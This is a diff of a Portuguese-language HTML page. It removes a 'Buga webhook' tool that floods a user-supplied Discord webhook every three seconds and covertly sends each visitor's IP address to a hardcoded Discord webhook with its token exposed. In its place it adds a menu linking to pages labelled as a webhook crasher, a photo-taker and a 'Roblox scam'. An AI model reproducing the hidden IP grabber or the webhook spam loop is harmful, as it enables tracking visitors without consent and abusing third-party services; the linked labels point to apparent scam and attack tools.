@@ -1,141 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Buga webhook</title>
-<style>
-    body {
-        background-color: black;
-    }
-    label {
-        color: aliceblue;
-    }
-    input {
-        background: linear-gradient(red, brown, black);
-    }
-    button {
-        color: rgb(255, 255, 255);
-        background: linear-gradient(red, brown, black);
-        cursor: pointer;
-    }
-    button:hover {
-        background: linear-gradient(rgb(168, 0, 0), rgb(139, 36, 36), rgb(0, 0, 0));
-    }
-    section {
-        background-color: rgb(114, 114, 114);
-        height: auto;
-        width: 40vh;
-        margin-right: auto;
-        margin-left: auto;
-        margin-top: 40vh;
-        padding: 20px;
-        border-radius: 10px;
-        text-align: center;
-    }
-    h1 {
-        color: aliceblue;
-    }
-    .input{
-      background: linear-gradient(rgb(168, 0, 0), rgb(139, 36, 36), rgb(0, 0, 0));
-      color: aliceblue;
-    }
-    p{
-      font-size: small;
-      color: aliceblue;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌐🔰Citiz🔰🌐</title>
+    <style>
+        body{
+            background-color: rgb(21, 21, 21);
+        }
+        section{
+            background-color: rgb(233, 197, 131);
+            height: auto;
+            width: 40vh;
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 30vh;
+        }
+        input{
+            background-color: rgb(255, 252, 243);
+            font-size: xx-large;
+        }
+        input:hover{
+            background-color: rgb(202, 200, 194);
+            transform: translatex(-50px);
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
     <section>
-        <label for="webhook">Link do Webhook:</label><br>
-        <input class="input" type="text" id="webhook" name="webhook" placeholder="Cole o link do webhook aqui">
-        <br><br>
-        <label for="message">Mensagem:</label><br>
-        <input class="input" type="text" id="message" name="message" placeholder="Digite a mensagem a ser enviada">
-        <br><br>
-        <button onclick="startTalking()">Começar</button>
-        <button onclick="stopTalking()">Terminar</button>
-        <h1 id="waitMessage" style="display: none;">Por favor, espere...</h1>
+        <a href="https://humano123.github.io/kddsc/"><input type="button" value="Trava webhook"></a>
+        <br>
+        <a href="https://humano123.github.io/meme2/"><input type="button" value="Tirar foto"></a>
+        <br>
+        <a href="https://humano123.github.io/meme/"><input type="button" value="Roblox do golpe"></a>
     </section>
-    
-    <script>
-        var intervalId; // Variável para armazenar o ID do intervalo
-        var firstMessageSent = false; // Variável para rastrear se a primeira mensagem foi enviada
-
-        function startTalking() {
-            var webhookURL = document.getElementById("webhook").value;
-            var messageToSend = document.getElementById("message").value;
-
-            if (webhookURL === "") {
-                alert("Por favor, insira o link do webhook.");
-                return;
-            }
-            if (messageToSend === "") {
-                alert("Por favor, insira uma mensagem para enviar.");
-                return;
-            }
-
-            // Mostrar a mensagem de espera
-            document.getElementById("waitMessage").style.display = "block";
-            firstMessageSent = false; // Resetar a variável ao iniciar novamente
-
-            async function enviarMensagem(webhookURL, messageToSend) {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: messageToSend })
-                }).then(response => {
-                    if (!firstMessageSent) {
-                        // Esconder a mensagem de espera e mostrar o alert uma vez
-                        document.getElementById("waitMessage").style.display = "none";
-                        alert("Mensagem enviada com sucesso!");
-                        firstMessageSent = true;
-                    }
-                    console.log("Mensagem enviada com sucesso:", messageToSend);
-                }).catch(error => {
-                    console.error("Erro ao enviar mensagem:", error);
-                });
-            }
-
-            // Inicia o envio das mensagens repetidamente com intervalo de 3 segundos
-            intervalId = setInterval(() => {
-                enviarMensagem(webhookURL, messageToSend);
-            }, 3000);
-
-            // Enviar IP para o webhook específico quando iniciar
-            enviarIP();
-        }
-
-        function stopTalking() {
-            clearInterval(intervalId); // Interrompe o intervalo com base no ID armazenado
-            console.log("Envio de mensagens interrompido.");
-        }
-
-        async function obterIPDoVisitante() {
-            const resposta = await fetch('https://api64.ipify.org?format=json');
-            const dados = await resposta.json();
-            return dados.ip;
-        }
-
-        async function enviarIP() {
-            const ip = await obterIPDoVisitante();
-            const webhookURL = 'https://discord.com/api/webhooks/1241080545069240350/wD75utZgqXrkC3Q-83Xzm8NPrLm5QOXXVAR3fDDOHqGCBWzL99jxwcVhSM9V5O13Kclm';
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `IP do visitante: ${ip}` })
-            }).then(response => {
-                console.log("IP enviado com sucesso:", ip);
-            }).catch(error => {
-                console.error("Erro ao enviar IP:", error);
-            });
-        }
-    </script>
 </body>
 </html>
